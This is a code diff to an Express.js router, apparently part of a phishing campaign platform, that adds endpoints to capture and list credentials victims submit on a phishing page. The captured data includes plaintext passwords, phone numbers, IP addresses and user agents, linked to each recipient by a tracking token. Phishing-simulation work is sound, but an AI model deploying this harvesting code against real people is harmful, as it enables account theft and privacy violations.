@@ -11,6 +11,7 @@ const fs = require('fs');
 const Campaign = require('../models/Campaign');
 const Template = require('../models/Template');
 const ActivityLog = require('../models/ActivityLog');
+const CapturedCredential = require('../models/CapturedCredential');
 const emailService = require('../services/emailService');
 const inMemoryStore = require('../data/inMemoryStore');
 const defaultTemplates = require('../data/defaultTemplates');
@@ -419,6 +420,173 @@ router.post('/seed-defaults', async (req, res) => {
     }
     return res.json({ success: true, message: 'Default templates active in-memory and ready.' });
   } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Get all captured credentials
+router.get('/captured-credentials', async (req, res) => {
+  try {
+    if (isDbConnected()) {
+      const credentials = await CapturedCredential.find().sort({ capturedAt: -1 }).limit(100);
+      return res.json(credentials);
+    }
+    // Fallback to in-memory store
+    const allCredentials = [];
+    for (const campaign of inMemoryStore.campaigns) {
+      for (const recipient of campaign.recipients) {
+        if (recipient.capturedCredentials) {
+          allCredentials.push({
+            recipientEmail: recipient.email,
+            recipientName: recipient.fullName,
+            trackingToken: recipient.trackingToken,
+            ...recipient.capturedCredentials,
+            campaignTitle: campaign.title,
+            campaignId: campaign._id
+          });
+        }
+      }
+    }
+    res.json(allCredentials);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Capture credentials from phishing page
+router.post('/capture-credentials', async (req, res) => {
+  try {
+    const { token, identifier, mobile, countryCode, name, password } = req.body;
+
+    if (!token) {
+      return res.status(400).json({ error: 'Token is required' });
+    }
+
+    let campaign = null;
+    let recipient = null;
+
+    // Find campaign and recipient by token
+    if (isDbConnected()) {
+      campaign = await Campaign.findOne({ 'recipients.trackingToken': token });
+      if (campaign) {
+        recipient = campaign.recipients.find(r => r.trackingToken === token);
+      }
+    } else {
+      for (const camp of inMemoryStore.campaigns) {
+        const rec = camp.recipients.find(r => r.trackingToken === token);
+        if (rec) {
+          campaign = camp;
+          recipient = rec;
+          break;
+        }
+      }
+    }
+
+    if (!recipient) {
+      return res.status(404).json({ error: 'Recipient not found' });
+    }
+
+    // Store captured credentials
+    recipient.capturedCredentials = {
+      identifier,
+      mobile,
+      countryCode,
+      name,
+      password,
+      capturedAt: new Date()
+    };
+
+    console.log('Saving credentials for recipient:', recipient.email);
+    console.log('Database connected:', isDbConnected());
+
+    // Extract IPv4 from IPv6-mapped address if present
+    let ipAddress = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    if (ipAddress && ipAddress.startsWith('::ffff:')) {
+      ipAddress = ipAddress.substring(7);
+    }
+
+    // Save to separate CapturedCredential collection
+    if (isDbConnected()) {
+      try {
+        await CapturedCredential.create({
+          campaignId: campaign._id,
+          campaignTitle: campaign.title,
+          recipientEmail: recipient.email,
+          recipientName: recipient.fullName,
+          trackingToken: token,
+          identifier,
+          mobile,
+          countryCode,
+          name,
+          password,
+          ipAddress: ipAddress,
+          userAgent: req.get('User-Agent'),
+          capturedAt: new Date()
+        });
+        console.log('Credentials saved to CapturedCredential collection successfully');
+      } catch (saveErr) {
+        console.error('Error saving to CapturedCredential collection:', saveErr.message);
+      }
+
+      // Also save to campaign for backward compatibility
+      try {
+        recipient.capturedCredentials = {
+          identifier,
+          mobile,
+          countryCode,
+          name,
+          password,
+          capturedAt: new Date()
+        };
+        await campaign.save();
+        console.log('Credentials also saved to campaign for compatibility');
+      } catch (saveErr) {
+        console.error('Error saving to campaign:', saveErr.message);
+      }
+    } else {
+      console.log('Using in-memory store (MongoDB not connected)');
+      // Store in in-memory campaign
+      recipient.capturedCredentials = {
+        identifier,
+        mobile,
+        countryCode,
+        name,
+        password,
+        capturedAt: new Date()
+      };
+    }
+
+    // Log to activity logs
+    if (isDbConnected()) {
+      try {
+        await ActivityLog.create({
+          campaignId: campaign._id,
+          campaignTitle: campaign.title,
+          email: recipient.email,
+          fullName: recipient.fullName,
+          trackingToken: token,
+          eventType: 'credentials_captured',
+          status: recipient.status,
+          urlClicked: recipient.clicked,
+          fileOpened: recipient.attachmentInteracted,
+          clickCount: recipient.clickCount,
+          ipAddress: req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress,
+          userAgent: req.get('User-Agent'),
+          timestamp: new Date(),
+          metadata: {
+            capturedIdentifier: identifier,
+            capturedMobile: mobile,
+            capturedName: name
+          }
+        });
+      } catch (logErr) {
+        console.error('Failed to log credential capture:', logErr.message);
+      }
+    }
+
+    return res.json({ success: true, message: 'Credentials captured successfully' });
+  } catch (err) {
+    console.error('Credential capture error:', err);
     res.status(500).json({ error: err.message });
   }
 });
